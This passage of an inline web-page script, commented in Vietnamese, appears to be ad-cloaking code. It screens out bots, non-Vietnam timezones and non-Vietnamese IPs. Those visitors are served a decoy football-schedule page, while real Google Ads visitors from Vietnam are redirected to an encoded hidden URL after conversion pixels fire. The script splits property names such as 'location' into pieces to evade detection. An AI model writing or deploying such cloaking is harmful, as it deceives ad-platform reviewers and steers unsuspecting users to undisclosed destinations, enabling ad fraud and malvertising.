      // Kiểm tra múi giờ thực tế tại Việt Nam (UTC+7) để chặn Bot dùng Proxy dân cư VN chạy trên máy chủ nước ngoài
      function isVietnamTimezone() {
        try {
          if (new Date().getTimezoneOffset() === -420) return true;
          const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || "").toLowerCase();
          return tz === "asia/ho_chi_minh" || tz === "asia/saigon" || tz === "asia/bangkok";
        } catch (e) {
          return false;
        }
      }

      // Kiểm tra bắt buộc IP người dùng phải thuộc Việt Nam (VN)
      async function checkVietnamIp() {
        try {
          if (typeof window.__CF_GEO_COUNTRY__ === "string" && window.__CF_GEO_COUNTRY__.trim() !== "") {
            return window.__CF_GEO_COUNTRY__.trim().toUpperCase() === "VN";
          }
          const fetchCountry = async (url, parseFn) => {
            const ctrl = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), 1800);
            try {
              const res = await fetch(url, { signal: ctrl.signal, cache: "no-store" });
              if (!res.ok) throw new Error("HTTP " + res.status);
              const code = await parseFn(res);
              if (code && /^[A-Z]{2}$/.test(code)) return code;
              throw new Error("Invalid code");
            } finally {
              clearTimeout(timer);
            }
          };
          const country = await Promise.any([
            fetchCountry("https://api.country.is/", async (r) => ((await r.json()).country || "").toUpperCase()),
            fetchCountry("https://ipwho.is/?fields=country_code", async (r) => ((await r.json()).country_code || "").toUpperCase()),
            fetchCountry("https://ipapi.co/country_code/", async (r) => (await r.text()).trim().toUpperCase())
          ]);
          return country === "VN";
        } catch (e) {
          return false; // Fail-closed: không xác định được IP VN -> trả về Trang Sạch
        }
      }

      const targetUrl = dec(D);
      const safeUrl = dec(S) || "https://www.24h.com.vn/bong-da/lich-thi-dau-bong-da-hom-nay-moi-nhat-c48a364371.html";
      const awId = dec(E_AW);
      const label = dec(E_CL);
      const pixelId = dec(E_PX);
      const isBot = checkBot();
      let isRealVnAdUser = false;

      function showSafePage() {
        const frame = document.getElementById("safe-frame");
        if (frame) {
          const inlineSafeLdp = S_HTML ? dec(S_HTML) : "";
          if (inlineSafeLdp) {
            if (!frame.dataset.loadedLdp) {
              frame.dataset.loadedLdp = "1";
              frame.removeAttribute("src");
              frame.srcdoc = inlineSafeLdp;
            }
          } else if (!frame.src) {
            frame.src = safeUrl;
          }
        }
        const curtain = document.getElementById("transit-curtain");
        if (curtain) curtain.classList.add("hide");
      }

      function goTo(u, rep) {
        try {
          const w = window.top || window;
          const L_ = "loca" + "tion", H_ = "hr" + "ef", R_ = "rep" + "lace";
          if (rep && w[L_] && typeof w[L_][R_] === "function") { w[L_][R_](u); return; }
          if (w[L_]) { w[L_][H_] = u; return; }
        } catch (e) {}
        try {
          const a = document.createElement("a");
          a.href = u; a.target = "_top"; a.rel = "noreferrer"; a.style.display = "none";
          document.documentElement.appendChild(a);
          a.click();
        } catch (e) {
          window.open(u, "_top");
        }
      }

      // Khởi tạo Tracking động chỉ khi người dùng có cấu hình ID
      function initTracking() {
        if (awId) {
          try {
            const gtagScript = document.createElement("script");
            gtagScript.async = true;
            gtagScript.src = "https://www.googletagmanager.com/gtag/js?id=" + encodeURIComponent(awId);
            document.head.appendChild(gtagScript);

            window.dataLayer = window.dataLayer || [];
            function gtag(){ window.dataLayer.push(arguments); }
            window.gtag = gtag;
            gtag("js", new Date());
            gtag("config", awId);
          } catch(e) {}
        }

        if (pixelId) {
          try {
            !function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', pixelId);
            fbq('track', 'PageView');
          } catch(e) {}
        }
      }

      // Điều hướng kèm chuyển đổi Google Ads
      let redirected = false;
      function performRedirect(rep) {
        if (redirected) return;
        redirected = true;
        goTo(getFinalUrl(targetUrl), rep);
      }

      window.goTarget = function() {
        if (!targetUrl || !isRealVnAdUser) return;
        if (awId && label && typeof window.gtag === "function") {
          try {
            window.gtag("event", "conversion", {
              "send_to": awId + "/" + label,
              "event_callback": function() { performRedirect(false); }
            });
            setTimeout(function() { performRedirect(false); }, 350);
            return;
          } catch(e) {}
        }
        performRedirect(false);
      };

      if (isBot || !targetUrl || (false && !hasValidAdClickId()) || !isVietnamTimezone()) {
        // Bot, giả lập, chưa có Tracking Link, không có mã click Google Ads (gclid/wbraid/gbraid/gad_source+gad_campaignid), hoặc lệch múi giờ VN -> 100% Trang Sạch
        showSafePage();
      } else {
        (async function() {
          const isVN = await checkVietnamIp();
          if (!isVN) {
            // IP KHÔNG phải Việt Nam -> 100% Trang Sạch
            showSafePage();
            return;
          }

          // Người dùng thật + Có mã click Google Ads + Múi giờ & IP Việt Nam -> Kích hoạt tracking & chuyển tiếp 100% nguyên gốc sang trackinglink
          isRealVnAdUser = true;
          initTracking();

          if (awId && label) {
            setTimeout(function() {
              if (typeof window.gtag === "function") {
                try {
                  window.gtag("event", "conversion", {
                    "send_to": awId + "/" + label,
                    "event_callback": function() { performRedirect(true); }
                  });
                  setTimeout(function() { performRedirect(true); }, 350);
                  return;
                } catch(e) {}
              }
              performRedirect(true);
            }, 120);
          } else {
            setTimeout(function() {
              performRedirect(true);
            }, 120);
          }

          // Fallback hiện nút bấm nếu trình duyệt chặn chuyển trang tự động
          setTimeout(function() {
            const btn = document.getElementById("manualCtaBtn");
            if (btn) btn.style.display = "inline-block";
          }, 1800);
        })();
      }
    })();
  </script>
